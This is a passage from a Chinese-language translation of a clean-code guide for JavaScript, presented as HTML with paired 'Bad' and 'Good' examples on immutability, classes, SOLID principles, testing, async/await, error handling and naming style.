<code>addItemToCart()</code> 方法添加商品到购物车，修改 <code>购物车数组</code>。此时调用 <code>purchase()</code> 方法购买，由于引用传递，获取的 <code>购物车数组</code> 正好是最新的数据。</p>\n<p>看起来没问题对不对？</p>\n<p>如果当用户点击购买时，网络出现故障， <code>purchase()</code> 方法一直在重复调用，与此同时用户又添加了新的商品，这时网络又恢复了。那么 <code>purchase()</code> 方法获取到 <code>购物车数组</code> 就是错误的。</p>\n<p>为了避免这种问题，我们需要在每次新增商品时，克隆 <code>购物车数组</code> 并返回新的数组。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>const addItemToCart = (cart, item) =&gt; {\n  cart.push({ item, date: Date.now() });\n};\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>const addItemToCart = (cart, item) =&gt; {\n  return [...cart, {item, date: Date.now()}]\n};\n</code></pre><h4>不要写全局方法</h4>\n<p>在 JavaScript 中，永远不要污染全局，会在生产环境中产生难以预料的 bug。举个例子，比如你在 <code>Array.prototype</code> 上新增一个 <code>diff</code> 方法来判断两个数组的不同。而你同事也打算做类似的事情，不过他的 <code>diff</code> 方法是用来判断两个数组首位元素的不同。很明显你们方法会产生冲突，遇到这类问题我们可以用 ES2015/ES6 的语法来对 <code>Array</code> 进行扩展。\n<strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>Array.prototype.diff = function diff(comparisonArray) {\n  const hash = new Set(comparisonArray);\n  return this.filter(elem =&gt; !hash.has(elem));\n};\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>class SuperArray extends Array {\n  diff(comparisonArray) {\n    const hash = new Set(comparisonArray);\n    return this.filter(elem =&gt; !hash.has(elem));        \n  }\n}\n</code></pre><h4>比起命令式我更喜欢函数式编程</h4>\n<p>函数式变编程可以让代码的逻辑更清晰更优雅，方便测试。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>const programmerOutput = [\n  {\n    name: &#x27;Uncle Bobby&#x27;,\n    linesOfCode: 500\n  }, {\n    name: &#x27;Suzie Q&#x27;,\n    linesOfCode: 1500\n  }, {\n    name: &#x27;Jimmy Gosling&#x27;,\n    linesOfCode: 150\n  }, {\n    name: &#x27;Gracie Hopper&#x27;,\n    linesOfCode: 1000\n  }\n];\n\nlet totalOutput = 0;\n\nfor (let i = 0; i &lt; programmerOutput.length; i++) {\n  totalOutput += programmerOutput[i].linesOfCode;\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>const programmerOutput = [\n  {\n    name: &#x27;Uncle Bobby&#x27;,\n    linesOfCode: 500\n  }, {\n    name: &#x27;Suzie Q&#x27;,\n    linesOfCode: 1500\n  }, {\n    name: &#x27;Jimmy Gosling&#x27;,\n    linesOfCode: 150\n  }, {\n    name: &#x27;Gracie Hopper&#x27;,\n    linesOfCode: 1000\n  }\n];\nlet totalOutput = programmerOutput\n  .map(output =&gt; output.linesOfCode)\n  .reduce((totalLines, lines) =&gt; totalLines + lines, 0)\n</code></pre><h4>封装条件语句</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>if (fsm.state === &#x27;fetching&#x27; &amp;&amp; isEmpty(listNode)) {\n  &#x2F;&#x2F; ...\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function shouldShowSpinner(fsm, listNode) {\n  return fsm.state === &#x27;fetching&#x27; &amp;&amp; isEmpty(listNode);\n}\n\nif (shouldShowSpinner(fsmInstance, listNodeInstance)) {\n  &#x2F;&#x2F; ...\n}\n</code></pre><h4>尽量别用“非”条件句</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function isDOMNodeNotPresent(node) {\n  &#x2F;&#x2F; ...\n}\n\nif (!isDOMNodeNotPresent(node)) {\n  &#x2F;&#x2F; ...\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function isDOMNodePresent(node) {\n  &#x2F;&#x2F; ...\n}\n\nif (isDOMNodePresent(node)) {\n  &#x2F;&#x2F; ...\n}\n</code></pre><h4>避免使用条件语句</h4>\n<p>Q：不用条件语句写代码是不可能的。\nA：绝大多数场景可以用多态替代。\nQ：用多态可行，但为什么就不能用条件语句了呢？\nA：为了让代码更简洁易读，如果你的函数中出现了条件判断，那么说明你的函数不止干了一件事情，违反了函数单一原则。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>class Airplane {\n  &#x2F;&#x2F; ...\n  \n  &#x2F;&#x2F; 获取巡航高度\n  getCruisingAltitude() {\n    switch (this.type) {\n      case &#x27;777&#x27;:\n        return this.getMaxAltitude() - this.getPassengerCount();\n      case &#x27;Air Force One&#x27;:\n        return this.getMaxAltitude();\n      case &#x27;Cessna&#x27;:\n        return this.getMaxAltitude() - this.getFuelExpenditure();\n    }\n  }\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>class Airplane {\n  &#x2F;&#x2F; ...\n}\n&#x2F;&#x2F; 波音777\nclass Boeing777 extends Airplane {\n  &#x2F;&#x2F; ...\n  getCruisingAltitude() {\n    return this.getMaxAltitude() - this.getPassengerCount();\n  }\n}\n&#x2F;&#x2F; 空军一号\nclass AirForceOne extends Airplane {\n  &#x2F;&#x2F; ...\n  getCruisingAltitude() {\n    return this.getMaxAltitude();\n  }\n}\n&#x2F;&#x2F; 赛纳斯飞机\nclass Cessna extends Airplane {\n  &#x2F;&#x2F; ...\n  getCruisingAltitude() {\n    return this.getMaxAltitude() - this.getFuelExpenditure();\n  }\n}\n</code></pre><h4>避免类型检查（第一部分）</h4>\n<p>JavaScript 是无类型的，意味着你可以传任意类型参数，这种自由度很容易让人困扰，不自觉的就会去检查类型。仔细想想是你真的需要检查类型还是你的 API 设计有问题？</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function travelToTexas(vehicle) {\n  if (vehicle instanceof Bicycle) {\n    vehicle.pedal(this.currentLocation, new Location(&#x27;texas&#x27;));\n  } else if (vehicle instanceof Car) {\n    vehicle.drive(this.currentLocation, new Location(&#x27;texas&#x27;));\n  }\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function travelToTexas(vehicle) {\n  vehicle.move(this.currentLocation, new Location(&#x27;texas&#x27;));\n}\n</code></pre><h4>避免类型检查（第二部分）</h4>\n<p>如果你需要做静态类型检查，比如字符串、整数等，推荐使用 TypeScript，不然你的代码会变得又臭又长。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function combine(val1, val2) {\n  if (typeof val1 === &#x27;number&#x27; &amp;&amp; typeof val2 === &#x27;number&#x27; ||\n      typeof val1 === &#x27;string&#x27; &amp;&amp; typeof val2 === &#x27;string&#x27;) {\n    return val1 + val2;\n  }\n\n  throw new Error(&#x27;Must be of type String or Number&#x27;);\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function combine(val1, val2) {\n  return val1 + val2;\n}\n</code></pre><h4>不要过度优化</h4>\n<p>现代浏览器已经在底层做了很多优化，过去的很多优化方案都是无效的，会浪费你的时间，想知道现代浏览器优化了哪些内容，<a href=\"https://github.com/petkaantonov/bluebird/wiki/Optimization-killers\">请点这里</a>。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 在老的浏览器中，由于 &#96;list.length&#96; 没有做缓存，每次迭代都会去计算，造成不必要开销。\n&#x2F;&#x2F; 现代浏览器已对此做了优化。\nfor (let i = 0, len = list.length; i &lt; len; i++) {\n  &#x2F;&#x2F; ...\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>for (let i = 0; i &lt; list.length; i++) {\n  &#x2F;&#x2F; ...\n}\n</code></pre><h4>删除弃用代码</h4>\n<p>很多时候有些代码已经没有用了，但担心以后会用，舍不得删。</p>\n<p>如果你忘了这件事，这些代码就永远存在那里了。</p>\n<p>放心删吧，你可以在代码库历史版本中找他它。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function oldRequestModule(url) {\n  &#x2F;&#x2F; ...\n}\n\nfunction newRequestModule(url) {\n  &#x2F;&#x2F; ...\n}\n\nconst req = newRequestModule;\ninventoryTracker(&#x27;apples&#x27;, req, &#x27;www.inventory-awesome.io&#x27;);\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function newRequestModule(url) {\n  &#x2F;&#x2F; ...\n}\n\nconst req = newRequestModule;\ninventoryTracker(&#x27;apples&#x27;, req, &#x27;www.inventory-awesome.io&#x27;);\n</code></pre><h3>对象和数据结构</h3>\n<h4>用 get、set 方法操作数据</h4>\n<p>这样做可以带来很多好处，比如在操作数据时打日志，方便跟踪错误；在 <code>set</code> 的时候很容易对数据进行校验…</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function makeBankAccount() {\n  &#x2F;&#x2F; ...\n\n  return {\n    balance: 0,\n    &#x2F;&#x2F; ...\n  };\n}\n\nconst account = makeBankAccount();\naccount.balance = 100;\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function makeBankAccount() {\n  &#x2F;&#x2F; 私有变量\n  let balance = 0;\n\n  function getBalance() {\n    return balance;\n  }\n  \n  function setBalance(amount) {\n    &#x2F;&#x2F; ... 在更新 balance 前，对 amount 进行校验\n    balance = amount;\n  }\n\n  return {\n    &#x2F;&#x2F; ...\n    getBalance,\n    setBalance,\n  };\n}\n\nconst account = makeBankAccount();\naccount.setBalance(100);\n</code></pre><h4>使用私有变量</h4>\n<p>可以用闭包来创建私有变量</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>const Employee = function(name) {\n  this.name = name;\n};\n\nEmployee.prototype.getName = function getName() {\n  return this.name;\n};\n\nconst employee = new Employee(&#x27;John Doe&#x27;);\nconsole.log(&#96;Employee name: ${employee.getName()}&#96;); &#x2F;&#x2F; Employee name: John Doe\ndelete employee.name;\nconsole.log(&#96;Employee name: ${employee.getName()}&#96;); &#x2F;&#x2F; Employee name: undefined\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function makeEmployee(name) {\n  return {\n    getName() {\n      return name;\n    },\n  };\n}\n\nconst employee = makeEmployee(&#x27;John Doe&#x27;);\nconsole.log(&#96;Employee name: ${employee.getName()}&#96;); &#x2F;&#x2F; Employee name: John Doe\ndelete employee.name;\nconsole.log(&#96;Employee name: ${employee.getName()}&#96;); &#x2F;&#x2F; Employee name: John Doe\n</code></pre><h3>类</h3>\n<h4>使用 class</h4>\n<p>在 ES2015/ES6 之前，没有类的语法，只能用构造函数的方式模拟类，可读性非常差。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 动物\nconst Animal = function(age) {\n  if (!(this instanceof Animal)) {\n    throw new Error(&#x27;Instantiate Animal with &#96;new&#96;&#x27;);\n  }\n\n  this.age = age;\n};\n\nAnimal.prototype.move = function move() {};\n\n&#x2F;&#x2F; 哺乳动物\nconst Mammal = function(age, furColor) {\n  if (!(this instanceof Mammal)) {\n    throw new Error(&#x27;Instantiate Mammal with &#96;new&#96;&#x27;);\n  }\n\n  Animal.call(this, age);\n  this.furColor = furColor;\n};\n\nMammal.prototype = Object.create(Animal.prototype);\nMammal.prototype.constructor = Mammal;\nMammal.prototype.liveBirth = function liveBirth() {};\n\n&#x2F;&#x2F; 人类\nconst Human = function(age, furColor, languageSpoken) {\n  if (!(this instanceof Human)) {\n    throw new Error(&#x27;Instantiate Human with &#96;new&#96;&#x27;);\n  }\n\n  Mammal.call(this, age, furColor);\n  this.languageSpoken = languageSpoken;\n};\n\nHuman.prototype = Object.create(Mammal.prototype);\nHuman.prototype.constructor = Human;\nHuman.prototype.speak = function speak() {};\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 动物\nclass Animal {\n  constructor(age) {\n    this.age = age\n  };\n  move() {};\n}\n\n&#x2F;&#x2F; 哺乳动物\nclass Mammal extends Animal{\n  constructor(age, furColor) {\n    super(age);\n    this.furColor = furColor;\n  };\n  liveBirth() {};\n}\n\n&#x2F;&#x2F; 人类\nclass Human extends Mammal{\n  constructor(age, furColor, languageSpoken) {\n    super(age, furColor);\n    this.languageSpoken = languageSpoken;\n  };\n  speak() {};\n}\n</code></pre><h4>链式调用</h4>\n<p>这种模式相当有用，可以在很多库中发现它的身影，比如 jQuery、Lodash 等。它让你的代码简洁优雅。实现起来也非常简单，在类的方法最后返回 this 可以了。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>class Car {\n  constructor(make, model, color) {\n    this.make = make;\n    this.model = model;\n    this.color = color;\n  }\n\n  setMake(make) {\n    this.make = make;\n  }\n\n  setModel(model) {\n    this.model = model;\n  }\n\n  setColor(color) {\n    this.color = color;\n  }\n\n  save() {\n    console.log(this.make, this.model, this.color);\n  }\n}\n\nconst car = new Car(&#x27;Ford&#x27;,&#x27;F-150&#x27;,&#x27;red&#x27;);\ncar.setColor(&#x27;pink&#x27;);\ncar.save();\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>class Car {\n  constructor(make, model, color) {\n    this.make = make;\n    this.model = model;\n    this.color = color;\n  }\n\n  setMake(make) {\n    this.make = make;\n    return this;\n  }\n\n  setModel(model) {\n    this.model = model;\n    return this;\n  }\n\n  setColor(color) {\n    this.color = color;\n    return this;\n  }\n\n  save() {\n    console.log(this.make, this.model, this.color);\n    return this;\n  }\n}\n\nconst car = new Car(&#x27;Ford&#x27;,&#x27;F-150&#x27;,&#x27;red&#x27;)\n  .setColor(&#x27;pink&#x27;);\n  .save();\n</code></pre><h4>不要滥用继承</h4>\n<p>很多时候继承被滥用，导致可读性很差，要搞清楚两个类之间的关系，继承表达的一个属于关系，而不是包含关系，比如 Human-&gt;Animal vs. User-&gt;UserDetails</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>class Employee {\n  constructor(name, email) {\n    this.name = name;\n    this.email = email;\n  }\n\n  &#x2F;&#x2F; ...\n}\n\n&#x2F;&#x2F; TaxData（税收信息）并不是属于 Employee（雇员），而是包含关系。\nclass EmployeeTaxData extends Employee {\n  constructor(ssn, salary) {\n    super();\n    this.ssn = ssn;\n    this.salary = salary;\n  }\n\n  &#x2F;&#x2F; ...\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>class EmployeeTaxData {\n  constructor(ssn, salary) {\n    this.ssn = ssn;\n    this.salary = salary;\n  }\n\n  &#x2F;&#x2F; ...\n}\n\nclass Employee {\n  constructor(name, email) {\n    this.name = name;\n    this.email = email;\n  }\n\n  setTaxData(ssn, salary) {\n    this.taxData = new EmployeeTaxData(ssn, salary);\n  }\n  &#x2F;&#x2F; ...\n}\n</code></pre><h3>SOLID</h3>\n<p>SOLID 是几个单词首字母组合而来，分别表示 <code>单一功能原则</code>、<code>开闭原则</code>、<code>里氏替换原则</code>、<code>接口隔离原则</code>以及<code>依赖反转原则</code>。</p>\n<h4>单一功能原则</h4>\n<p>如果一个类干的事情太多太杂，会导致后期很难维护。我们应该厘清职责，各司其职减少相互之间依赖。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>class UserSettings {\n  constructor(user) {\n    this.user = user;\n  }\n\n  changeSettings(settings) {\n    if (this.verifyCredentials()) {\n      &#x2F;&#x2F; ...\n    }\n  }\n\n  verifyCredentials() {\n    &#x2F;&#x2F; ...\n  }\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>class UserAuth {\n  constructor(user) {\n    this.user = user;\n  }\n  verifyCredentials() {\n    &#x2F;&#x2F; ...\n  }\n}\n\nclass UserSetting {\n  constructor(user) {\n    this.user = user;\n    this.auth = new UserAuth(this.user);\n  }\n  changeSettings(settings) {\n    if (this.auth.verifyCredentials()) {\n      &#x2F;&#x2F; ...\n    }\n  }\n}\n}\n</code></pre><h4>开闭原则</h4>\n<p>“开”指的就是类、模块、函数都应该具有可扩展性，“闭”指的是它们不应该被修改。也就是说你可以新增功能但不能去修改源码。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>class AjaxAdapter extends Adapter {\n  constructor() {\n    super();\n    this.name = &#x27;ajaxAdapter&#x27;;\n  }\n}\n\nclass NodeAdapter extends Adapter {\n  constructor() {\n    super();\n    this.name = &#x27;nodeAdapter&#x27;;\n  }\n}\n\nclass HttpRequester {\n  constructor(adapter) {\n    this.adapter = adapter;\n  }\n\n  fetch(url) {\n    if (this.adapter.name === &#x27;ajaxAdapter&#x27;) {\n      return makeAjaxCall(url).then((response) =&gt; {\n        &#x2F;&#x2F; 传递 response 并 return\n      });\n    } else if (this.adapter.name === &#x27;httpNodeAdapter&#x27;) {\n      return makeHttpCall(url).then((response) =&gt; {\n        &#x2F;&#x2F; 传递 response 并 return\n      });\n    }\n  }\n}\n\nfunction makeAjaxCall(url) {\n  &#x2F;&#x2F; 处理 request 并 return promise\n}\n\nfunction makeHttpCall(url) {\n  &#x2F;&#x2F; 处理 request 并 return promise\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>class AjaxAdapter extends Adapter {\n  constructor() {\n    super();\n    this.name = &#x27;ajaxAdapter&#x27;;\n  }\n\n  request(url) {\n    &#x2F;&#x2F; 处理 request 并 return promise\n  }\n}\n\nclass NodeAdapter extends Adapter {\n  constructor() {\n    super();\n    this.name = &#x27;nodeAdapter&#x27;;\n  }\n\n  request(url) {\n    &#x2F;&#x2F; 处理 request 并 return promise\n  }\n}\n\nclass HttpRequester {\n  constructor(adapter) {\n    this.adapter = adapter;\n  }\n\n  fetch(url) {\n    return this.adapter.request(url).then((response) =&gt; {\n      &#x2F;&#x2F; 传递 response 并 return\n    });\n  }\n}\n</code></pre><h4>里氏替换原则</h4>\n<p>名字很唬人，其实道理很简单，就是子类不要去重写父类的方法。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 长方形\nclass Rectangle {\n  constructor() {\n    this.width = 0;\n    this.height = 0;\n  }\n\n  setColor(color) {\n    &#x2F;&#x2F; ...\n  }\n\n  render(area) {\n    &#x2F;&#x2F; ...\n  }\n\n  setWidth(width) {\n    this.width = width;\n  }\n\n  setHeight(height) {\n    this.height = height;\n  }\n\n  getArea() {\n    return this.width * this.height;\n  }\n}\n\n&#x2F;&#x2F; 正方形\nclass Square extends Rectangle {\n  setWidth(width) {\n    this.width = width;\n    this.height = width;\n  }\n\n  setHeight(height) {\n    this.width = height;\n    this.height = height;\n  }\n}\n\nfunction renderLargeRectangles(rectangles) {\n  rectangles.forEach((rectangle) =&gt; {\n    rectangle.setWidth(4);\n    rectangle.setHeight(5);\n    const area = rectangle.getArea(); \n    rectangle.render(area);\n  });\n}\n\nconst rectangles = [new Rectangle(), new Rectangle(), new Square()];\nrenderLargeRectangles(rectangles);\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>class Shape {\n  setColor(color) {\n    &#x2F;&#x2F; ...\n  }\n\n  render(area) {\n    &#x2F;&#x2F; ...\n  }\n}\n\nclass Rectangle extends Shape {\n  constructor(width, height) {\n    super();\n    this.width = width;\n    this.height = height;\n  }\n\n  getArea() {\n    return this.width * this.height;\n  }\n}\n\nclass Square extends Shape {\n  constructor(length) {\n    super();\n    this.length = length;\n  }\n\n  getArea() {\n    return this.length * this.length;\n  }\n}\n\nfunction renderLargeShapes(shapes) {\n  shapes.forEach((shape) =&gt; {\n    const area = shape.getArea();\n    shape.render(area);\n  });\n}\n\nconst shapes = [new Rectangle(4, 5), new Rectangle(4, 5), new Square(5)];\nrenderLargeShapes(shapes);\n</code></pre><h4>接口隔离原则</h4>\n<p>JavaScript 几乎没有接口的概念，所以这条原则很少被使用。官方定义是“客户端不应该依赖它不需要的接口”，也就是接口最小化，把接口解耦。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>class DOMTraverser {\n  constructor(settings) {\n    this.settings = settings;\n    this.setup();\n  }\n\n  setup() {\n    this.rootNode = this.settings.rootNode;\n    this.animationModule.setup();\n  }\n\n  traverse() {\n    &#x2F;&#x2F; ...\n  }\n}\n\nconst $ = new DOMTraverser({\n  rootNode: document.getElementsByTagName(&#x27;body&#x27;),\n  animationModule() {} &#x2F;&#x2F; Most of the time, we won&#x27;t need to animate when traversing.\n  &#x2F;&#x2F; ...\n});\n</code></pre><p>Good</p>\n<pre class=\"prettyprint language-js\"><code>class DOMTraverser {\n  constructor(settings) {\n    this.settings = settings;\n    this.options = settings.options;\n    this.setup();\n  }\n\n  setup() {\n    this.rootNode = this.settings.rootNode;\n    this.setupOptions();\n  }\n\n  setupOptions() {\n    if (this.options.animationModule) {\n      &#x2F;&#x2F; ...\n    }\n  }\n\n  traverse() {\n    &#x2F;&#x2F; ...\n  }\n}\n\nconst $ = new DOMTraverser({\n  rootNode: document.getElementsByTagName(&#x27;body&#x27;),\n  options: {\n    animationModule() {}\n  }\n});\n</code></pre><h4>依赖反转原则</h4>\n<p>说就两点：</p>\n<ol>\n<li>高层次模块不能依赖低层次模块，它们依赖于抽象接口。</li>\n<li>抽象接口不能依赖具体实现，具体实现依赖抽象接口。</li>\n</ol>\n<p>总结下来就两个字，解耦。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 库存查询\nclass InventoryRequester {\n  constructor() {\n    this.REQ_METHODS = [&#x27;HTTP&#x27;];\n  }\n\n  requestItem(item) {\n    &#x2F;&#x2F; ...\n  }\n}\n\n&#x2F;&#x2F; 库存跟踪\nclass InventoryTracker {\n  constructor(items) {\n    this.items = items;\n\n    &#x2F;&#x2F; 这里依赖一个特殊的请求类，其实我们只是需要一个请求方法。\n    this.requester = new InventoryRequester();\n  }\n\n  requestItems() {\n    this.items.forEach((item) =&gt; {\n      this.requester.requestItem(item);\n    });\n  }\n}\n\nconst inventoryTracker = new InventoryTracker([&#x27;apples&#x27;, &#x27;bananas&#x27;]);\ninventoryTracker.requestItems();\n</code></pre><p>Good</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 库存跟踪\nclass InventoryTracker {\n  constructor(items, requester) {\n    this.items = items;\n    this.requester = requester;\n  }\n\n  requestItems() {\n    this.items.forEach((item) =&gt; {\n      this.requester.requestItem(item);\n    });\n  }\n}\n\n&#x2F;&#x2F; HTTP 请求\nclass InventoryRequesterHTTP {\n  constructor() {\n    this.REQ_METHODS = [&#x27;HTTP&#x27;];\n  }\n\n  requestItem(item) {\n    &#x2F;&#x2F; ...\n  }\n}\n\n&#x2F;&#x2F; webSocket 请求\nclass InventoryRequesterWS {\n  constructor() {\n    this.REQ_METHODS = [&#x27;WS&#x27;];\n  }\n\n  requestItem(item) {\n    &#x2F;&#x2F; ...\n  }\n}\n\n&#x2F;&#x2F; 通过依赖注入的方式将请求模块解耦，这样我们就可以很轻易的替换成 webSocket 请求。\nconst inventoryTracker = new InventoryTracker([&#x27;apples&#x27;, &#x27;bananas&#x27;], new InventoryRequesterHTTP());\ninventoryTracker.requestItems();\n</code></pre><h3>测试</h3>\n<p>随着项目变得越来越庞大，时间线拉长，有的老代码可能半年都没碰过，如果此时上线，你有信心这部分代码能正常工作吗？测试的覆盖率和你的信心是成正比的。</p>\n<p>PS: 如果你发现你的代码很难被测试，那么你应该优化你的代码了。</p>\n<h4>单一化</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>import assert from &#x27;assert&#x27;;\n\ndescribe(&#x27;MakeMomentJSGreatAgain&#x27;, () =&gt; {\n  it(&#x27;handles date boundaries&#x27;, () =&gt; {\n    let date;\n\n    date = new MakeMomentJSGreatAgain(&#x27;1&#x2F;1&#x2F;2015&#x27;);\n    date.addDays(30);\n    assert.equal(&#x27;1&#x2F;31&#x2F;2015&#x27;, date);\n\n    date = new MakeMomentJSGreatAgain(&#x27;2&#x2F;1&#x2F;2016&#x27;);\n    date.addDays(28);\n    assert.equal(&#x27;02&#x2F;29&#x2F;2016&#x27;, date);\n\n    date = new MakeMomentJSGreatAgain(&#x27;2&#x2F;1&#x2F;2015&#x27;);\n    date.addDays(28);\n    assert.equal(&#x27;03&#x2F;01&#x2F;2015&#x27;, date);\n  });\n});\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>import assert from &#x27;assert&#x27;;\n\ndescribe(&#x27;MakeMomentJSGreatAgain&#x27;, () =&gt; {\n  it(&#x27;handles 30-day months&#x27;, () =&gt; {\n    const date = new MakeMomentJSGreatAgain(&#x27;1&#x2F;1&#x2F;2015&#x27;);\n    date.addDays(30);\n    assert.equal(&#x27;1&#x2F;31&#x2F;2015&#x27;, date);\n  });\n\n  it(&#x27;handles leap year&#x27;, () =&gt; {\n    const date = new MakeMomentJSGreatAgain(&#x27;2&#x2F;1&#x2F;2016&#x27;);\n    date.addDays(28);\n    assert.equal(&#x27;02&#x2F;29&#x2F;2016&#x27;, date);\n  });\n\n  it(&#x27;handles non-leap year&#x27;, () =&gt; {\n    const date = new MakeMomentJSGreatAgain(&#x27;2&#x2F;1&#x2F;2015&#x27;);\n    date.addDays(28);\n    assert.equal(&#x27;03&#x2F;01&#x2F;2015&#x27;, date);\n  });\n});\n</code></pre><h3>异步</h3>\n<h4>不再使用回调</h4>\n<p>不会有人愿意去看嵌套回调的代码，用 Promises 替代回调吧。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>import { get } from &#x27;request&#x27;;\nimport { writeFile } from &#x27;fs&#x27;;\n\nget(&#x27;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Robert_Cecil_Martin&#x27;, (requestErr, response) =&gt; {\n  if (requestErr) {\n    console.error(requestErr);\n  } else {\n    writeFile(&#x27;article.html&#x27;, response.body, (writeErr) =&gt; {\n      if (writeErr) {\n        console.error(writeErr);\n      } else {\n        console.log(&#x27;File written&#x27;);\n      }\n    });\n  }\n});\n</code></pre><p>Good</p>\n<pre class=\"prettyprint language-js\"><code>get(&#x27;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Robert_Cecil_Martin&#x27;)\n  .then((response) =&gt; {\n    return writeFile(&#x27;article.html&#x27;, response);\n  })\n  .then(() =&gt; {\n    console.log(&#x27;File written&#x27;);\n  })\n  .catch((err) =&gt; {\n    console.error(err);\n  });\n</code></pre><h4>Async/Await 比起 Promises 更简洁</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>import { get } from &#x27;request-promise&#x27;;\nimport { writeFile } from &#x27;fs-promise&#x27;;\n\nget(&#x27;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Robert_Cecil_Martin&#x27;)\n  .then((response) =&gt; {\n    return writeFile(&#x27;article.html&#x27;, response);\n  })\n  .then(() =&gt; {\n    console.log(&#x27;File written&#x27;);\n  })\n  .catch((err) =&gt; {\n    console.error(err);\n  });\n</code></pre><p>Good</p>\n<pre class=\"prettyprint language-js\"><code>import { get } from &#x27;request-promise&#x27;;\nimport { writeFile } from &#x27;fs-promise&#x27;;\n\nasync function getCleanCodeArticle() {\n  try {\n    const response = await get(&#x27;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Robert_Cecil_Martin&#x27;);\n    await writeFile(&#x27;article.html&#x27;, response);\n    console.log(&#x27;File written&#x27;);\n  } catch(err) {\n    console.error(err);\n  }\n}\n</code></pre><h3>错误处理</h3>\n<h4>不要忽略抛异常</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>try {\n  functionThatMightThrow();\n} catch (error) {\n  console.log(error);\n}\n</code></pre><p>Good</p>\n<pre class=\"prettyprint language-js\"><code>try {\n  functionThatMightThrow();\n} catch (error) {\n  &#x2F;&#x2F; 这一种选择，比起 console.log 更直观\n  console.error(error);\n  &#x2F;&#x2F; 也可以在界面上提醒用户\n  notifyUserOfError(error);\n  &#x2F;&#x2F; 也可以把异常传回服务器\n  reportErrorToService(error);\n  &#x2F;&#x2F; 其他的自定义方法\n}\n</code></pre><h4>不要忘了在 Promises 抛异常</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>getdata()\n  .then((data) =&gt; {\n    functionThatMightThrow(data);\n  })\n  .catch((error) =&gt; {\n    console.log(error);\n  });\n</code></pre><p>Good</p>\n<pre class=\"prettyprint language-js\"><code>getdata()\n  .then((data) =&gt; {\n    functionThatMightThrow(data);\n  })\n  .catch((error) =&gt; {\n    &#x2F;&#x2F; 这一种选择，比起 console.log 更直观\n    console.error(error);\n    &#x2F;&#x2F; 也可以在界面上提醒用户\n    notifyUserOfError(error);\n    &#x2F;&#x2F; 也可以把异常传回服务器\n    reportErrorToService(error);\n    &#x2F;&#x2F; 其他的自定义方法\n  });\n</code></pre><h3>代码风格</h3>\n<p>代码风格是主观的，争论哪种好哪种不好是在浪费生命。市面上有很多自动处理代码风格的工具，选一个喜欢就行了，我们来讨论几个非自动处理的部分。</p>\n<h4>常量大写</h4>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>const DAYS_IN_WEEK = 7;\nconst daysInMonth = 30;\n\nconst songs = [&#x27;Back In Black&#x27;, &#x27;Stairway to 